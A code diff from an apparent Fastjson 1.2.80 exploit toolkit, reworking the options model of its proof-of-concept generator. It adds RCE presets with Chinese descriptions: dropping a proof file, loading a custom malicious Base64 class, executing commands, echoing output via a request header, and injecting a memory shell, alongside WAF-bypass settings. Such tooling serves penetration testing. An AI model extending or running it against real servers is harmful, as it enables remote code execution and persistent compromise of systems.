@@ -6,6 +6,7 @@ from typing import Any, Literal, Optional
 
 from pydantic import BaseModel, Field
 
+from fastjson_toolkit.poc.v1_2_68.models import RcePresetField, normalize_rce_preset
 from fastjson_toolkit.waf.models import WafOptions
 
 EchoEngineField = Literal[
@@ -20,6 +21,16 @@ EchoEngineField = Literal[
     "struts2",
     "httpserver",
     "dfs",
+]
+
+__all__ = [
+    "EchoEngineField",
+    "Poc1280GenerateOptions",
+    "Poc1280GenerateResult",
+    "Poc1280SendOptions",
+    "Poc1280SendResult",
+    "RcePresetField",
+    "normalize_rce_preset",
 ]
 
 
@@ -53,13 +64,27 @@ class Poc1280GenerateOptions(BaseModel):
         "currency",
         description="Currency MiscCodec 字段：currency 或 currencyCode",
     )
-    echo: bool = Field(False, description="postgresql/jython/groovy 命令回显")
-    engine: EchoEngineField = Field("auto", description="回显引擎")
-    cmd: str = Field("id", description="回显默认命令")
-    cmd_header: str = Field("X-Cmd", description="命令请求头")
+    preset: RcePresetField = Field(
+        "file",
+        description=(
+            "postgresql/jython/groovy 预设：file=写证明文件（默认）；"
+            "custom=自备 class；exec=ProcessBuilder/静态块；"
+            "echo=命令回显；memshell=内存马"
+        ),
+    )
+    class_b64: Optional[str] = Field(
+        None, description="preset=custom 时的恶意 .class Base64"
+    )
+    echo: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=echo"
+    )
+    engine: EchoEngineField = Field("auto", description="回显引擎（preset=echo）")
+    cmd: str = Field("id", description="回显默认命令 / preset=exec 执行命令")
+    cmd_header: str = Field("X-Cmd", description="命令请求头（preset=echo）")
     attack_base: Optional[str] = Field(None, description="回显/内存马资源托管基址")
     memshell: bool = Field(
-        False, description="注入内存马（与 echo 互斥；postgresql/jython/groovy）"
+        False,
+        description="兼容旧字段：true 等价于 preset=memshell（postgresql/jython/groovy）",
     )
     ms_api: str = Field(
         "jar",
